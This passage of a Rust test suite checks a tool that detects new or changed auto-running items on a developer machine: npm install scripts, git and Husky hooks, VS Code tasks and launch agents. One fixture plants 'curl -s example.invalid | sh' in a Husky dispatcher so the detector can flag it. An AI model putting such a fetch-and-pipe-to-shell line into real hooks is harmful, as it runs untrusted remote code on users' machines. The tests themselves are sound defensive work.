    assert_eq!(
        e.coverage(kind),
        "full|read whole, not by key: dev/shop/.cursor/mcp.json (two equal keys that tools read differently)"
    );
}

#[test]
fn a_way_read_for_the_first_time_on_a_store_that_never_read_it_is_told_once_and_a_script_planted_after_is_found()
 {
    // A store of an earlier build held the checkouts and never read their package scripts:
    // what they hold at the first reading was there before anyone looked, so it is told once,
    // as information, and raised by no rule. A script planted after it is found.
    let e = Estate::new("upgrade");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"prepare\": \"husky\"");
    agent(&shop, HOOK);
    e.run();
    // As an earlier build left it: no reading of these kinds, nothing they asserted.
    let db = Connection::open(e.store()).unwrap();
    db.execute_batch(
        "DELETE FROM coverage_lack WHERE coverage IN (SELECT id FROM coverage
           WHERE kind LIKE '% of each checkout, the part that runs by itself'
              OR scope LIKE '%#/%');
         DELETE FROM assertion WHERE kind LIKE '% of each checkout, the part that runs by itself'
              OR scope LIKE '%#/%';
         DELETE FROM coverage WHERE kind LIKE '% of each checkout, the part that runs by itself'
              OR scope LIKE '%#/%';
         DELETE FROM unit_read WHERE kind LIKE '% of each checkout, the part that runs by itself';",
    )
    .unwrap();
    drop(db);
    e.run();
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    assert_eq!(e.told(), ["checkout:machine:mac/dev/shop (2)"]);
    e.seen();
    package(
        &shop,
        "\"prepare\": \"husky\", \"preinstall\": \"node x.js\"",
    );
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.package-install",
            "~/dev/shop/package.json#/scripts/preinstall"
        )]
    );
}

#[test]
fn a_run_pointed_at_one_folder_speaks_only_for_its_projects_and_the_next_run_finds_nothing_old() {
    // A reading of the checkouts is of those it looked into. A run the owner points at one
    // folder did not look at the projects elsewhere: what they hold is not gone, and the next
    // full run does not find it again as new, one alarm per project. What is planted there
    // meanwhile is still found.
    let e = Estate::new("pointed");
    let shop = e.checkout("dev/shop");
    let blog = e.checkout("dev/blog");
    let site = e.checkout("work/site");
    for c in [&shop, &blog, &site] {
        package(c, "\"postinstall\": \"node setup.js\"");
        agent(c, HOOK);
    }
    e.run();
    e.run_in(&e.home().join("work"));
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    package(
        &blog,
        "\"postinstall\": \"node setup.js\", \"preinstall\": \"node x.js\"",
    );
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.package-install",
            "~/dev/blog/package.json#/scripts/preinstall"
        )]
    );
}

#[test]
fn a_first_run_pointed_at_one_folder_is_silent_there_tells_projects_elsewhere_once_and_finds_what_appears_where_it_looked()
 {
    // The store's first check looked into the projects of one folder: what they hold is the
    // silent baseline. The projects elsewhere were never read; the first run that reads them
    // tells them once and raises nothing about them. What appears where the first run did
    // look, and a clone made after the first run that walked the whole home folder, are found.
    let e = Estate::new("pointed-first");
    let shop = e.checkout("dev/shop");
    let blog = e.checkout("dev/blog");
    let site = e.checkout("work/site");
    // Beside the folder, not in it, though its name begins the same.
    let tools = e.checkout("devtools/cli");
    for c in [&shop, &blog, &site, &tools] {
        package(c, "\"postinstall\": \"node setup.js\"");
        agent(c, HOOK);
    }
    e.run_in(&e.home().join("dev"));
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    package(
        &blog,
        "\"postinstall\": \"node setup.js\", \"preinstall\": \"node x.js\"",
    );
    let report = e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.package-install",
                "~/dev/blog/package.json#/scripts/preinstall"
            ),
            pair(FIRST_READ, "mac"),
        ]
    );
    assert_eq!(
        e.told(),
        [
            "checkout:machine:mac/devtools/cli (2)",
            "checkout:machine:mac/work/site (2)"
        ]
    );
    // What the projects elsewhere hold is not counted as new either.
    assert!(report.contains(", 1 new, 0 changed, 0 gone"), "{report}");
    e.seen();
    // A run pointed at a folder outside the home folder, never looked through before.
    let outside = e.0.join("outside/tool");
    put(&outside.join(".git/HEAD"), "ref: refs/heads/main\n");
    package(&outside, "\"preinstall\": \"node x.js\"");
    e.run_in(&e.0.join("outside"));
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    e.seen();
    let new = e.checkout("work/new");
    package(&new, "\"preinstall\": \"node x.js\"");
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.package-install",
            "~/work/new/package.json#/scripts/preinstall"
        )]
    );
}

#[test]
fn a_project_file_that_could_not_be_read_on_the_first_day_is_told_once_when_it_reads_and_a_neighbour_is_still_judged()
 {
    // The first check could not parse one project's task file and read the other's. When the
    // file can be read, what it holds was there all along: it is told once, never silent and
    // never a finding by its rule. A task that appears in the project that was read is found.
    let e = Estate::new("unparsed-then-read");
    let shop = e.checkout("dev/shop");
    let blog = e.checkout("dev/blog");
    put(
        &shop.join(".vscode/tasks.json"),
        "{ \"tasks\": [ { \"label\": } ] }",
    );
    put(&blog.join(".vscode/tasks.json"), ON_ASK);
    e.run();
    assert!(
        e.coverage(TASKS_KIND)
            .starts_with("partial|could not be read: dev/shop/.vscode/tasks.json ("),
        "{}",
        e.coverage(TASKS_KIND)
    );
    put(&shop.join(".vscode/tasks.json"), ON_OPEN);
    put(&blog.join(".vscode/tasks.json"), ON_OPEN);
    e.run();
    assert_eq!(
        e.found(),
        [
            pair("autorun.folder-open", "~/dev/blog/.vscode/tasks.json"),
            pair(FIRST_READ, "mac"),
        ]
    );
    assert_eq!(e.told(), ["checkout:machine:mac/dev/shop (1)"]);
}

/// Takes every permission off a folder and gives them back when dropped.
struct Locked(PathBuf);

impl Locked {
    fn new(path: PathBuf) -> Locked {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o000)).unwrap();
        Locked(path)
    }
}

impl Drop for Locked {
    fn drop(&mut self) {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&self.0, std::fs::Permissions::from_mode(0o755));
    }
}

#[test]
fn a_watched_place_that_could_not_be_read_on_the_first_day_is_said_and_told_once_when_it_reads() {
    // The first check could not list one folder of autostart items and says so. What that
    // folder holds when it is first read was there all along: told once, never a finding. In
    // the folder it did read, an item that appears later is found.
    let e = Estate::new("unreadable-place");
    let agents = e.home().join("Library/LaunchAgents");
    put(
        &agents.join("com.invented.sync.plist"),
        "<plist><dict/></plist>\n",
    );
    let system = e.0.join("system/Library/LaunchAgents");
    put(
        &system.join("com.invented.helper.plist"),
        "<plist><dict/></plist>\n",
    );
    {
        let _locked = Locked::new(agents.clone());
        let report = e.run();
        assert!(
            e.coverage(AUTOSTART_KIND)
                .starts_with("partial|could not be read: Library/LaunchAgents ("),
            "{}",
            e.coverage(AUTOSTART_KIND)
        );
        assert!(
            report.contains("not read in full: launch agents and daemons (partial)"),
            "{report}"
        );
    }
    put(
        &system.join("com.invented.other.plist"),
        "<plist><dict/></plist>\n",
    );
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "watched.autostart",
                "/Library/LaunchAgents/com.invented.other.plist"
            ),
            pair(FIRST_READ, "mac"),
        ]
    );
    assert_eq!(e.told(), ["file:machine:mac/Library/LaunchAgents (1)"]);
    assert_eq!(e.coverage(AUTOSTART_KIND), "full|");
}

#[test]
fn a_reading_that_read_nothing_is_still_the_baseline_of_the_places_it_found_empty() {
    // The only autostart folder that was there could not be listed, so the reading read
    // nothing. It still looked at the folders that were not there: an item that appears in
    // one of them is found, and counted, while what the locked folder held is told once.
    let e = Estate::new("read-nothing");
    let agents = e.home().join("Library/LaunchAgents");
    put(
        &agents.join("com.invented.sync.plist"),
        "<plist><dict/></plist>\n",
    );
    {
        let _locked = Locked::new(agents.clone());
        e.run();
        assert!(
            e.coverage(AUTOSTART_KIND)
                .starts_with("none|could not be read: Library/LaunchAgents ("),
            "{}",
            e.coverage(AUTOSTART_KIND)
        );
    }
    let system = e.0.join("system/Library/LaunchAgents");
    put(
        &system.join("com.invented.other.plist"),
        "<plist><dict/></plist>\n",
    );
    let report = e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "watched.autostart",
                "/Library/LaunchAgents/com.invented.other.plist"
            ),
            pair(FIRST_READ, "mac"),
        ]
    );
    assert!(report.contains(", 1 new, 0 changed, 0 gone"), "{report}");
}

#[test]
fn hooks_first_read_when_a_checkouts_git_file_becomes_a_folder_are_told_once_and_a_hook_added_after_is_found()
 {
    // While `.git` is a file the hooks are kept elsewhere and were not read. When it becomes
    // a folder, the hooks found in it were there before anyone looked: told once. A hook added
    // after that is found.
    let e = Estate::new("git-file");
    let tree = e.home().join("dev/tree");
    put(
        &tree.join(".git"),
        "gitdir: /invented/.git/worktrees/tree\n",
    );
    e.run();
    std::fs::remove_file(tree.join(".git")).unwrap();
    put(&tree.join(".git/HEAD"), "ref: refs/heads/main\n");
    put(&tree.join(".git/hooks/pre-commit"), "#!/bin/sh\n");
    e.run();
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    assert_eq!(e.told(), ["checkout:machine:mac/dev/tree (1)"]);
    e.seen();
    put(&tree.join(".git/hooks/post-merge"), "#!/bin/sh\n");
    e.run();
    assert_eq!(
        e.found(),
        [pair("watched.git-hook", "~/dev/tree/.git/hooks/post-merge")]
    );
}

#[test]
fn git_hooks_follow_the_effective_folder_and_leave_remote_edits_quiet() {
    let e = Estate::new("git-hooks-path");
    let tree = e.checkout("dev/tree");
    let config = tree.join(".git/config");
    let first = tree.join("first hooks");
    put(
        &e.home().join(".gitconfig"),
        "[include]\n path = absent.conf\n",
    );
    put(
        &config,
        "[core]\n hooksPath = ignored\n HOOKSPATH = \"first hooks\"\n",
    );
    put(&first.join("pre-commit"), "# baseline\n");
    put(&tree.join(".git/hooks/pre-commit"), "# inactive\n");
    e.full();
    assert!(e.found().is_empty());
    put(
        &config,
        "[remote \"origin\"]\n url = https://example.invalid/project\n[core]\n hooksPath = \"first hooks\"\n",
    );
    e.full();
    assert!(e.found().is_empty());
    put(&first.join("pre-commit"), "# changed\n");
    e.full();
    assert_eq!(
        e.found(),
        [pair(
            "watched.git-hook",
            "~/dev/tree/first hooks/pre-commit"
        )]
    );

    e.seen();
    let shared = e.home().join(".shared-hooks");
    put(&shared.join("pre-push"), "# already present\n");
    put(
        &config,
        &format!("[core]\n hooksPath = {}\n", shared.display()),
    );
    e.full();
    assert_eq!(
        e.found(),
        [
            pair("watched.git-hook", "~/.shared-hooks/pre-push"),
            pair("watched.git-hook", "~/dev/tree/first hooks/pre-commit"),
        ]
    );
    e.seen();
    e.full();
    assert!(e.found().is_empty());
    assert_eq!(
        live_hooks(&e),
        [
            "file:machine:mac/.shared-hooks/pre-push",
            "file:machine:mac/dev/tree/.git/hooks/pre-commit"
        ]
    );
}

#[test]
fn git_hooks_keep_the_last_observation_when_configuration_cannot_be_resolved() {
    let e = Estate::new("git-hooks-config-gap");
    let tree = e.checkout("dev/tree");
    let config = tree.join(".git/config");
    let hook = tree.join("hooks/pre-push");
    put(&config, "[core]\n hooksPath = hooks\n");
    put(&hook, "# baseline\n");
    e.full();
    put(
        &tree.join(".git/more.conf"),
        "[core]\n hooksPath = elsewhere\n",
    );
    for (config_bytes, why) in [
        (
            "[core]\n hooksPath = hooks\n[includeIf \"gitdir:/elsewhere/\"]\n path = more.conf\n"
                .to_string(),
            "includeIf",
        ),
        ("[unclosed\n".to_string(), "could not parse"),
        ("#".repeat(1024 * 1024 + 1), "size cap"),
    ] {
        put(&config, &config_bytes);
        e.full();
        let coverage = e.rows("SELECT completeness, reason FROM coverage WHERE scope = 'checkout:machine:mac/dev/tree' AND reader = 'watched-places' ORDER BY id DESC LIMIT 1").join("");
        assert!(
            coverage.starts_with("partial|") && coverage.contains(why),
            "{coverage}"
        );
        assert_eq!(e.rows("SELECT subject FROM assertion WHERE predicate = 'watched_as' AND object = 'git hook' AND layer = 'live'"), ["file:machine:mac/dev/tree/hooks/pre-push"]);
        assert!(e.rows("SELECT entry FROM journal WHERE entry = 'removed' AND subject = 'file:machine:mac/dev/tree/hooks/pre-push'").is_empty());
    }
    let global = e.home().join(".gitconfig");
    put(&global, "[unclosed\n");
    put(&config, "[core]\n hooksPath = /dev/null\n");
    e.full();
    assert!(e.rows("SELECT reason FROM coverage WHERE scope = 'checkout:machine:mac/dev/tree' AND reader = 'watched-places' ORDER BY id DESC LIMIT 1")[0].contains("could not parse"));
    assert_eq!(e.rows("SELECT subject FROM assertion WHERE predicate = 'watched_as' AND object = 'git hook' AND layer = 'live'"), ["file:machine:mac/dev/tree/hooks/pre-push"]);
    std::fs::remove_file(global).unwrap();
    put(&config, "[core]\n hooksPath = /dev/null\n");
    e.full();
    assert_eq!(e.rows("SELECT completeness, reason FROM coverage WHERE scope = 'checkout:machine:mac/dev/tree' AND reader = 'watched-places' ORDER BY id DESC LIMIT 1"), ["full|the checkout has no hooks"]);
    assert!(e.rows("SELECT subject FROM assertion WHERE predicate = 'watched_as' AND object = 'git hook' AND layer = 'live'").is_empty());
    assert!(hook.exists());
}

#[test]
fn git_hooks_shared_between_checkouts_are_gone_only_after_the_last_checkout_stops_using_them() {
    let e = Estate::new("git-hooks-shared");
    let configs = ["dev/a", "dev/b"].map(|repo| e.checkout(repo).join(".git/config"));
    let hooks = e.home().join(".shared-hooks");
    let shared = format!("[core]\n hooksPath = {}\n", hooks.display());
    let off = "[core]\n hooksPath = /dev/null\n";
    put(&hooks.join("pre-commit"), "# shared\n");
    for config in &configs {
        put(config, &shared);
    }
    e.full();
    put(&configs[1], off);
    e.full();
    assert!(e.found().is_empty());
    assert_eq!(e.status()["watched"]["since_last_reading"]["gone"], 0);

    // A is compared first. During this check the same file moves from A to B.
    put(&configs[0], off);
    put(&configs[1], &shared);
    e.full();
    assert_eq!(e.status()["watched"]["since_last_reading"]["gone"], 0);
    assert_eq!(e.rows("SELECT text FROM journal WHERE entry = 'removed' AND predicate = 'watched_as' AND subject = 'file:machine:mac/.shared-hooks/pre-commit' ORDER BY seq"), ["this hook is still watched in another checkout", "this hook is still watched in another checkout"]);
    assert!(e.rows("SELECT object FROM assertion WHERE predicate = 'has_content' AND layer = 'retracted' AND subject = 'file:machine:mac/.shared-hooks/pre-commit'").is_empty());

    e.seen();
    put(&configs[1], off);
    e.full();
    assert_eq!(
        e.found(),
        [pair("watched.git-hook", "~/.shared-hooks/pre-commit")]
    );
    assert_eq!(e.status()["watched"]["since_last_reading"]["gone"], 1);
}

/// A local configuration whose hook folder cannot be told: Git would read `more.conf` only
/// in a Git folder that is elsewhere.
const UNTOLD_CONFIG: &str =
    "[core]\n hooksPath = hooks\n[includeIf \"gitdir:/elsewhere/\"]\n path = more.conf\n";

#[test]
fn hooks_in_a_configured_folder_read_for_the_first_time_are_told_once_as_the_baseline_and_never_raised_as_new()
 {
    // As an earlier version left the store: `.git/hooks` read in full, the folder Git's
    // configuration names never told (`dev/a`) or never reached (`dev/b`).
    let e = Estate::new("hooks-first-told");
    let a = e.checkout("dev/a");
    put(
        &a.join(".git/more.conf"),
        "[core]\n hooksPath = elsewhere\n",
    );
    put(&a.join(".git/config"), UNTOLD_CONFIG);
    put(&a.join("hooks/pre-commit"), "# husky\n");
    let b = e.checkout("dev/b");
    let locked = e.0.join("locked");
    put(&locked.join("hooks/pre-push"), "# shared\n");
    put(
        &b.join(".git/config"),
        &format!("[core]\n hooksPath = {}\n", locked.join("hooks").display()),
    );
    mode(&locked, 0o000);
    e.full();
    mode(&locked, 0o755);
    assert!(e.found().is_empty(), "{:?}", e.found());
    put(&a.join(".git/config"), "[core]\n hooksPath = hooks\n");
    let before = e.last_entry();
    e.full();
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    let mut told = e.told();
    told.sort();
    assert_eq!(told.len(), 2, "{told:?}");
    assert_eq!(told[0], "checkout:machine:mac/dev/a (1)");
    assert!(told[1].ends_with("/locked/hooks/pre-push (1)"), "{told:?}");
    assert_eq!(e.silent_after(before), 0);
    // Kept as the baseline: a hook added there afterwards is new.
    e.seen();
    put(&a.join("hooks/post-merge"), "# planted\n");
    e.full();
    assert_eq!(
        e.found(),
        [pair("watched.git-hook", "~/dev/a/hooks/post-merge")]
    );
}

#[test]
fn a_hook_in_a_folder_git_now_runs_hooks_from_is_new_where_an_earlier_run_told_the_folder_before() {
    let e = Estate::new("hooks-told-before");
    let x = e.checkout("dev/x");
    let y = e.checkout("dev/y");
    put(
        &y.join(".git/more.conf"),
        "[core]\n hooksPath = elsewhere\n",
    );
    e.full();
    // `dev/x` moves from `.git/hooks` to a folder with a hook; `dev/y` to one that cannot
    // be told, and then to one that can.
    put(&x.join(".git/config"), "[core]\n hooksPath = tools\n");
    put(&x.join("tools/pre-commit"), "# moved\n");
    put(&y.join(".git/config"), UNTOLD_CONFIG);
    put(&y.join("hooks/pre-push"), "# moved\n");
    e.full();
    assert_eq!(
        e.found(),
        [pair("watched.git-hook", "~/dev/x/tools/pre-commit")]
    );
    e.seen();
    put(&y.join(".git/config"), "[core]\n hooksPath = hooks\n");
    e.full();
    assert_eq!(
        e.found(),
        [pair("watched.git-hook", "~/dev/y/hooks/pre-push")]
    );
}

/// A pnpm file in a checkout made in the launch agents' folder, so it is watched in two places:
/// as a launch agent and as the project's. The project stops being a checkout as the file
/// changes, in one run: its place in the project is gone, and the launch agents' reading still
/// reads its content, which changed.
fn gone_from_one_place_changed_in_another(tag: &str) -> Estate {
    let e = Estate::new(tag);
    let agents = e.checkout("Library/LaunchAgents");
    let file = agents.join(".pnpmfile.cjs");
    put(&file, "module.exports = {};\n");
    e.run_in(&agents);
    e.run_in(&agents);
    std::fs::remove_dir_all(agents.join(".git")).unwrap();
    put(&file, "module.exports = { hooks: {} };\n");
    e.run_in(&agents);
    e
}

#[test]
fn a_file_gone_from_one_place_and_changed_in_another_in_one_run_is_counted_as_gone_and_as_changed()
{
    let e = gone_from_one_place_changed_in_another("gone-and-changed");
    let path = "Library/LaunchAgents/.pnpmfile.cjs";
    let listed: Vec<String> = e.status()["watched"]["changes"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|c| c["path_text"] == path)
        .map(|c| c["change"].as_str().unwrap().to_string())
        .collect();
    assert!(
        listed.contains(&"gone".to_string()) && listed.contains(&"changed".to_string()),
        "{listed:?}"
    );
    // The checkout's `.git` was an entry of the launch agents' folder too.
    let since = &e.status()["watched"]["since_last_reading"];
    assert_eq!((&since["gone"], &since["changed"]), (&2.into(), &1.into()));
}

#[test]
fn a_file_gone_from_one_place_whose_content_another_still_reads_journals_no_removed_digest() {
    let e = gone_from_one_place_changed_in_another("gone-still-read");
    assert_eq!(
        e.rows(
            "SELECT old_value FROM journal WHERE entry = 'removed' AND predicate = 'has_content'"
        ),
        Vec::<String>::new()
    );
}

#[test]
fn a_hook_another_checkout_watched_as_a_hook_before_this_run_is_not_new_where_a_second_starts_using_it()
 {
    let e = Estate::new("hooks-already-watched");
    let [a, b, c, d, f, g] =
        ["dev/a", "dev/b", "dev/c", "dev/d", "dev/f", "dev/g"].map(|r| e.checkout(r));
    let points = |dir: &Path| format!("[core]\n hooksPath = {}\n", dir.display());
    let shared = e.home().join(".shared-hooks");
    put(&shared.join("pre-commit"), "# shared\n");
    put(&a.join(".git/config"), &points(&shared));
    put(
        &c.join(".git/more.conf"),
        "[core]\n hooksPath = elsewhere\n",
    );
    put(&c.join(".git/config"), UNTOLD_CONFIG);
    put(
        &g.join(".git/more.conf"),
        "[core]\n hooksPath = elsewhere\n",
    );
    put(&g.join(".git/config"), UNTOLD_CONFIG);
    // Watched as a launch agent, not as a hook.
    let agents = e.home().join("Library/LaunchAgents");
    put(&agents.join("pre-commit"), "# an agent\n");
    e.full();
    // `dev/b`, and `dev/g` told for the first time, take the folder `dev/a` uses: a hook
    // read before is not read for the first time where a checkout first tells its folder;
    // `dev/c`,
    // told for the first time, and `dev/d` take a new one in the same run; `dev/f` takes the
    // launch agents' folder.
    let fresh = e.home().join(".fresh-hooks");
    put(&fresh.join("pre-commit"), "# fresh\n");
    put(&b.join(".git/config"), &points(&shared));
    put(&g.join(".git/config"), &points(&shared));
    put(&c.join(".git/config"), &points(&fresh));
    put(&d.join(".git/config"), &points(&fresh));
    put(&f.join(".git/config"), &points(&agents));
    e.full();
    // `dev/c`'s first reading of the new folder is told once; `dev/d`'s move to it is new.
    assert_eq!(
        e.found(),
        [
            pair(FIRST_READ, "mac"),
            pair("watched.git-hook", "~/.fresh-hooks/pre-commit"),
            pair("watched.git-hook", "~/Library/LaunchAgents/pre-commit"),
        ]
    );
    assert_eq!(e.told(), ["file:machine:mac/.fresh-hooks/pre-commit (1)"]);
    assert_eq!(e.status()["watched"]["since_last_reading"]["new"], 2);
    assert_eq!(
        e.rows("SELECT scope, text FROM journal WHERE entry = 'added' AND predicate = 'watched_as' AND subject = 'file:machine:mac/.shared-hooks/pre-commit' ORDER BY seq"),
        [
            "checkout:machine:mac/dev/a|first reading of its place",
            "checkout:machine:mac/dev/b|this hook is already watched in another checkout",
            "checkout:machine:mac/dev/g|this hook is already watched in another checkout"
        ]
    );
    e.seen();
    put(&shared.join("pre-push"), "# added\n");
    e.full();
    assert_eq!(
        e.found(),
        [pair("watched.git-hook", "~/.shared-hooks/pre-push")]
    );
}

#[test]
fn a_hook_that_changed_is_raised_even_where_another_checkout_starts_using_its_folder_in_the_same_run()
 {
    // `dev/a` is compared before `dev/z`, which owns the folder, in a full run; `dev/y` is the
    // only checkout of a run pointed at it.
    for (owner, taker, pointed) in [("dev/z", "dev/a", false), ("dev/x", "dev/y", true)] {
        let e = Estate::new("hooks-changed-elsewhere");
        let shared = e.home().join(".shared");
        let config = format!("[core]\n hooksPath = {}\n", shared.display());
        put(&shared.join("pre-commit"), "# v1\n");
        put(&e.checkout(owner).join(".git/config"), &config);
        let taker = e.checkout(taker);
        e.full();
        e.full();
        put(&shared.join("pre-commit"), "# v2\n");
        put(&taker.join(".git/config"), &config);
        if pointed {
            e.run_in(&taker);
        } else {
            e.full();
        }
        assert_eq!(
            e.found(),
            [pair("watched.git-hook", "~/.shared/pre-commit")],
            "{owner} {pointed}"
        );
    }
}

#[test]
fn a_hook_outside_a_new_clone_in_the_folder_its_configuration_names_is_new() {
    let e = Estate::new("hooks-new-clone");
    e.checkout("dev/a");
    e.full();
    let b = e.checkout("dev/b");
    let hooks = e.home().join("b-hooks");
    put(&hooks.join("pre-commit"), "# planted\n");
    put(
        &b.join(".git/config"),
        &format!("[core]\n hooksPath = {}\n", hooks.display()),
    );
    e.full();
    assert_eq!(
        e.found(),
        [pair("watched.git-hook", "~/b-hooks/pre-commit")]
    );
}

/// A checkout whose hooks a hooks manager keeps, in the shape Husky 9 writes them:
/// `core.hooksPath` set to `.husky/_`, a stub there for each hook that sources the
/// dispatcher `h`, which runs the script of the same name one folder up. The content is
/// invented.
fn husky(e: &Estate, rel: &str) -> PathBuf {
    let c = e.checkout(rel);
    put(&c.join(".git/config"), "[core]\n\thooksPath = .husky/_\n");
    put(&c.join(".husky/_/.gitignore"), "*\n");
    put(
        &c.join(".husky/_/h"),
        "#!/usr/bin/env sh\nn=$(basename \"$0\")\ns=$(dirname \"$(dirname \"$0\")\")/$n\n[ -f \"$s\" ] || exit 0\nsh -e \"$s\" \"$@\"\n",
    );
    for hook in ["pre-commit", "commit-msg", "pre-push"] {
        put(
            &c.join(".husky/_").join(hook),
            "#!/usr/bin/env sh\n. \"$(dirname \"$0\")/h\"\n",
        );
    }
    put(&c.join(".husky/pre-commit"), "npm test\n");
    put(&c.join(".husky/install.mjs"), "// set up the hooks\n");
    c
}

#[test]
fn a_hooks_managers_script_in_a_checkout_raises_a_finding_when_it_changes_and_its_neighbours_do_not()
 {
    let e = Estate::new("husky-scripts");
    let app = husky(&e, "dev/app");
    e.full();
    put(
        &app.join(".husky/pre-commit"),
        "npm test\nnode .husky/sync.js\n",
    );
    e.full();
    assert_eq!(
        e.found(),
        [pair("watched.git-hook", "~/dev/app/.husky/pre-commit")]
    );
    e.seen();
    // A file of the folder under no hook name, and a script taken away, raise nothing.
    put(&app.join(".husky/install.mjs"), "// changed\n");
    std::fs::remove_file(app.join(".husky/pre-commit")).unwrap();
    e.full();
    assert!(e.found().is_empty(), "{:?}", e.found());
}

#[test]
fn a_change_to_the_dispatcher_every_husky_hook_sources_is_a_finding() {
    let e = Estate::new("husky-dispatcher");
    let app = husky(&e, "dev/app");
    e.full();
    put(
        &app.join(".husky/_/h"),
        "#!/usr/bin/env sh\ncurl -s example.invalid | sh\n",
    );
    e.full();
    assert_eq!(
        e.found(),
        [pair("watched.git-hook", "~/dev/app/.husky/_/h")]
    );
}

#[test]
fn git_hooks_config_parsing_cannot_activate_git_tracing() {
    let e = Estate::new("git-hooks-trace");
    let tree = e.checkout("dev/tree");
    let trace = e.0.join("trace.log");
    // Git's startup can load Trace2 settings even for `git config --file -`.
    put(
        &e.home().join(".gitconfig"),
        &format!("[trace2]\n normalTarget = {}\n", trace.display()),
    );
    put(&tree.join(".git/config"), "[core]\n hooksPath = tools\n");
    put(&tree.join("tools/pre-commit"), "# fixture\n");
    e.full();
    assert!(!trace.exists());
    assert_eq!(e.rows("SELECT subject FROM assertion WHERE predicate = 'watched_as' AND object = 'git hook' AND layer = 'live'"), ["file:machine:mac/dev/tree/tools/pre-commit"]);
}

#[test]
fn git_hooks_respect_path_permissions_and_read_regular_targets_with_a_cap() {
    let e = Estate::new("git-hooks-targets");
    let tree = e.checkout("dev/tree");
    let config = tree.join(".git/config");
    let hooks = tree.join("tools");
    let data = e.home().join(".data/leaf");
    put(&data, "# baseline\n");
    put(
        &hooks.join("helper.txt"),
        "# outside the documented hook names\n",
    );
    link(data.to_str().unwrap(), &hooks.join("pre-push"));
    let fifo = hooks.join("pre-commit");
    assert!(
        Command::new("/usr/bin/mkfifo")
            .arg(&fifo)
            .status()
            .unwrap()
            .success()
    );
    put(&config, "[core]\n hooksPath = tools\n");
    e.full();
    assert_eq!(e.rows("SELECT object FROM assertion WHERE predicate = 'has_content' AND layer = 'live' AND subject = 'file:machine:mac/dev/tree/tools/pre-commit'"), ["not a regular file: fifo"]);
    assert_eq!(e.rows("SELECT CAST(count(*) AS TEXT) FROM assertion WHERE predicate = 'watched_as' AND object = 'git hook' AND layer = 'live'"), ["2"]);
    put(&data, &"x".repeat(8 * 1024 * 1024 + 1));
    e.full();
    assert_eq!(
        e.found(),
        [pair("watched.git-hook", "~/dev/tree/tools/pre-push")]
    );
    assert_eq!(
        e.rows("SELECT completeness, reason FROM coverage WHERE scope = 'file:machine:mac/dev/tree/tools/pre-push' AND kind = 'content of a watched file' ORDER BY id DESC LIMIT 1"),
        ["none|over the size cap of 8 MiB"]
    );

    put(
        &e.home().join("Documents/hidden/pre-commit"),
        "# do not read\n",
    );
    let alias = e.home().with_file_name("HOME");
    put(
        &config,
        &format!(
            "[core]\n hooksPath = {}/Documents/hidden\n",
            alias.display()
        ),
    );
    e.full();
    let coverage = e.rows("SELECT completeness, reason FROM coverage WHERE scope = 'checkout:machine:mac/dev/tree' AND reader = 'watched-places' ORDER BY id DESC LIMIT 1").join("");
    assert!(
        coverage.starts_with("partial|") && coverage.matches("~/Documents").count() == 1,
        "{coverage}"
    );
    assert_eq!(e.rows("SELECT CAST(count(*) AS TEXT) FROM assertion WHERE predicate = 'watched_as' AND object = 'git hook' AND layer = 'live'"), ["2"]);
}

#[test]
fn git_hooks_in_a_checkout_explicitly_given_to_the_reader_cannot_expand_that_permission() {
    let e = Estate::new("git-hooks-given-checkout");
    let tree = e.checkout("Documents/given/tree");
    let root = e.home().join("Documents/given");
    let outside = e.home().join("Documents/other");
    let config = tree.join(".git/config");
    put(&tree.join("tools/pre-commit"), "# own hook\n");
    put(&outside.join("pre-push"), "# outside the given folder\n");
    put(&config, "[core]\n hooksPath = tools\n");
    e.run_in(&root);
    let paths = || {
        e.rows("SELECT subject FROM assertion WHERE predicate = 'watched_as' AND object = 'git hook' AND layer = 'live'")
    };
    let coverage = || {
        e.rows("SELECT completeness, reason FROM coverage WHERE scope = 'checkout:machine:mac/Documents/given/tree' AND reader = 'watched-places' ORDER BY id DESC LIMIT 1")
    };
    assert_eq!(
        paths(),
        ["file:machine:mac/Documents/given/tree/tools/pre-commit"]
    );
    assert_eq!(coverage(), ["full|"]);
    link(outside.to_str().unwrap(), &tree.join("linked"));
    for path in ["../../other", "linked"] {
        put(&config, &format!("[core]\n hooksPath = {path}\n"));
        e.run_in(&root);
        assert_eq!(
            paths(),
            ["file:machine:mac/Documents/given/tree/tools/pre-commit"]
        );
        let coverage = coverage();
        assert!(
            coverage[0].starts_with("partial|") && coverage[0].contains("~/Documents"),
            "{coverage:?}"
        );
    }
}

#[test]
fn git_hooks_resolve_inherited_paths_from_the_worktree_and_receive_paths_from_git_dir() {
    let e = Estate::new("git-hooks-inherited");
    let tree = e.checkout("dev/tree");
    put(
        &e.0.join("system/etc/gitconfig"),
        "[core]\n hooksPath = system-hooks\n",
    );
    put(
        &e.home().join(".config/git/config"),
        "[core]\n hooksPath = xdg-hooks\n",
    );
    let global = e.home().join(".gitconfig");
    put(&global, "[core]\n hooksPath = user-hooks\n");
    for folder in ["system-hooks", "xdg-hooks", "user-hooks"] {
        put(&tree.join(folder).join("pre-push"), "# worktree\n");
    }
    put(&tree.join("user-hooks/pre-receive"), "# wrong base\n");
    put(
        &tree.join(".git/user-hooks/pre-receive"),
        "# Git's receive hook\n",
    );
    // `git receive-pack` runs `git gc --auto` in the Git directory, and with it this hook.
    put(
        &tree.join(".git/user-hooks/pre-auto-gc"),
        "# after a push\n",
    );
    let paths = || {
        e.rows("SELECT subject FROM assertion WHERE predicate = 'watched_as' AND object = 'git hook' AND layer = 'live' ORDER BY subject")
    };
    e.full();
    assert_eq!(
        paths(),
        [
